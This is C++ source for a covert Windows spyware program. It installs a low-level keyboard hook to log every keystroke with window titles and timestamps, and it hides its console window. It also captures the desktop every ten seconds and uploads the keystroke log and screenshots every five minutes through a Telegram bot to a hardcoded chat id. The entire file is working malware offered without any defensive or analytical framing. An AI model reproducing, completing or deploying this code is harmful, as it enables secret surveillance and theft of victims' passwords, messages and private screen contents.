
#include <tgbot/tgbot.h>
#include <Windows.h> 
#include <stdio.h>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>
#include <ctime>
#include <thread>
#include <iostream>
#include <locale>

#define SM_SYSTEMDOCKED           0x2004

//6884529861 chat id 
// 
// 
// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define invisible // (visible / invisible)
// Defines whether you want to enable or disable 
// boot time waiting if running at system boot.
#define nowait // (bootwait / nowait)
// defines which format to use for logging
// 0 for default, 10 for dec codes, 16 for hex codex
#define FORMAT 0
// defines if ignore mouseclicksHello
#define mouseignore
// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.

#if FORMAT == 0
const std::map<int, std::string> keyname{
	{VK_BACK, "[BACKSPACE]" },
	{VK_RETURN,	"\n" },
	{VK_SPACE,	"_" },
	{VK_TAB,	"[TAB]" },
	{VK_SHIFT,	"[SHIFT]" },
	{VK_LSHIFT,	"[LSHIFT]" },
	{VK_RSHIFT,	"[RSHIFT]" },
	{VK_CONTROL,	"[CONTROL]" },
	{VK_LCONTROL,	"[LCONTROL]" },
	{VK_RCONTROL,	"[RCONTROL]" },
	{VK_MENU,	"[ALT]" },
	{VK_LWIN,	"[LWIN]" },
	{VK_RWIN,	"[RWIN]" },
	{VK_ESCAPE,	"[ESCAPE]" },
	{VK_END,	"[END]" },
	{VK_HOME,	"[HOME]" },
	{VK_LEFT,	"[LEFT]" },
	{VK_RIGHT,	"[RIGHT]" },
	{VK_UP,		"[UP]" },
	{VK_DOWN,	"[DOWN]" },
	{VK_PRIOR,	"[PG_UP]" },
	{VK_NEXT,	"[PG_DOWN]" },
	{VK_OEM_PERIOD,	"." },
	{VK_DECIMAL,	"." },
	{VK_OEM_PLUS,	"+" },
	{VK_OEM_MINUS,	"-" },
	{VK_ADD,		"+" },
	{VK_SUBTRACT,	"-" },
	{VK_CAPITAL,	"[CAPSLOCK]" },
};
#endif
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream output_file;

// This is the callback function. Consider it the event that is raised when, in this case,
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			// save to file
			Save(kbdStruct.vkCode);
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		LPCWSTR a = L"Failed to install hook!";
		LPCWSTR b = L"Error";
		MessageBox(NULL, a, b, MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}


int Save(int key_stroke)
{
	std::stringstream output;
	static char lastwindow[256] = "";
#ifndef mouseignore 
	if ((key_stroke == 1) || (key_stroke == 2))
	{
		return 0; // ignore mouse clicks
	}
#endif
	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;

	if (foreground)
	{
		// get keyboard layout of the thread
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}

	if (foreground)
	{
		char window_title[256];
		GetWindowTextA(foreground, (LPSTR)window_title, 256);

		if (strcmp(window_title, lastwindow) != 0)
		{
			strcpy_s(lastwindow, sizeof(lastwindow), window_title);
			// get time
			struct tm tm_info;
			time_t t = time(NULL);
			localtime_s(&tm_info, &t);
			char s[64];
			strftime(s, sizeof(s), "%FT%X%z", &tm_info);

			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
		}
	}

#if FORMAT == 10
	output << '[' << key_stroke << ']';
#elif FORMAT == 16
	output << std::hex << "[" << key_stroke << ']';
#else
	if (keyname.find(key_stroke) != keyname.end())
	{
		output << keyname.at(key_stroke);
	}
	else
	{
		char key;
		// check caps lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// check shift key
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		{
			lowercase = !lowercase;
		}

		// map virtual key according to keyboard layout
		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		// tolower converts it to lowercase properly
		if (!lowercase)
		{
			key = tolower(key);
		}
		output << char(key);
	}
#endif
	// instead of opening and closing file handlers every time, keep file open and flush.
	output_file << output.str();
	output_file.flush();

	std::cout << output.str();

	return 0;
}
void Stealth()
{
#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif

#ifdef invisible
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);; // invisible window
	//FreeConsole(); // Detaches the process from the console window. This effectively hides the console window and fixes the broken invisible define.
#endif
}

// Function to check if the system is still booting up
bool IsSystemBooting()
{
	return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
}

BOOL WINAPI SaveBitmap(WCHAR* wPath)
{
	BITMAPFILEHEADER bfHeader;
	BITMAPINFOHEADER biHeader;
	BITMAPINFO bInfo;
	HGDIOBJ hTempBitmap;
	HBITMAP hBitmap;
	BITMAP bAllDesktops;
	HDC hDC, hMemDC;
	LONG lWidth, lHeight;
	BYTE* bBits = NULL;
	HANDLE hHeap = GetProcessHeap();
	DWORD cbBits, dwWritten = 0;
	HANDLE hFile;
	INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
	INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);

	ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
	ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
	ZeroMemory(&bInfo, sizeof(BITMAPINFO));
	ZeroMemory(&bAllDesktops, sizeof(BITMAP));

	hDC = GetDC(NULL);
	hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
	GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);

	lWidth = bAllDesktops.bmWidth;
	lHeight = bAllDesktops.bmHeight;

	DeleteObject(hTempBitmap);

	bfHeader.bfType = (WORD)('B' | ('M' << 8));
	bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
	biHeader.biSize = sizeof(BITMAPINFOHEADER);
	biHeader.biBitCount = 24;
	biHeader.biCompression = BI_RGB;
	biHeader.biPlanes = 1;
	biHeader.biWidth = lWidth;
	biHeader.biHeight = lHeight;

	bInfo.bmiHeader = biHeader;

	cbBits = (((24 * lWidth + 31) & ~31) / 8) * lHeight;

	hMemDC = CreateCompatibleDC(hDC);
	hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID**)&bBits, NULL, 0);
	SelectObject(hMemDC, hBitmap);
	BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);


	hFile = CreateFileW(wPath, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		DeleteDC(hMemDC);
		ReleaseDC(NULL, hDC);
		DeleteObject(hBitmap);

		return FALSE;
	}
	WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
	WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
	WriteFile(hFile, bBits, cbBits, &dwWritten, NULL);
	FlushFileBuffers(hFile);
	CloseHandle(hFile);

	DeleteDC(hMemDC);
	ReleaseDC(NULL, hDC);
	DeleteObject(hBitmap);

	return TRUE;
}


void TakeScreenshot() {
	WCHAR wPath[MAX_PATH] = L"screenshot.jpg";

	for (int i = 0; i < 60; ++i) {  // ������� 60 ��������
		SaveBitmap(wPath);
		Sleep(10000);  // ���� 10 ������
	}
}


void Loggin() {
	const char* output_filename = "keylogger.txt";
	std::cout << "Logging output to " << output_filename << std::endl;
	output_file.open(output_filename, std::ios_base::app);
	SetHook();
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{

	}
}


void bot() {
	TgBot::Bot bot("YOUR_BOT_TOKEN");

	const std::string filename = "keylogger.txt";
	const std::string photoMimeType1 = "text/plain";
	const std::string photoFilePath = "screenshot.jpg";
	const std::string photoMimeType = "image/jpeg";

	try {
		printf("Bot username: %s\n", bot.getApi().getMe()->username.c_str());

		// ���� �������� ����� � ���
		while (true) {
			bot.getApi().sendDocument(6884529861, TgBot::InputFile::fromFile(photoFilePath, photoMimeType));
			bot.getApi().sendDocument(6884529861, TgBot::InputFile::fromFile(filename, photoMimeType1));

			printf("Files sent to bot.\n");

			// �������� �� ����������
			std::this_thread::sleep_for(std::chrono::minutes(5));

			// ������ Long Poll ��� ������� ����������
			TgBot::TgLongPoll longPoll(bot);
			longPoll.start();
		}
	}
	catch (TgBot::TgException& e) {
		printf("Error: %s\n", e.what());
	}
}


int main() {
	std::setlocale(LC_ALL, "rus");

	// ������ ������� ������������ ����
	Stealth();

	// ��������� ������
	std::thread t1(TakeScreenshot);
	std::thread t2(Loggin);
	std::thread t3(bot);

	// ���������� ���������� ������
	t1.join();
	t2.join();
	t3.join();

	return 0;
}
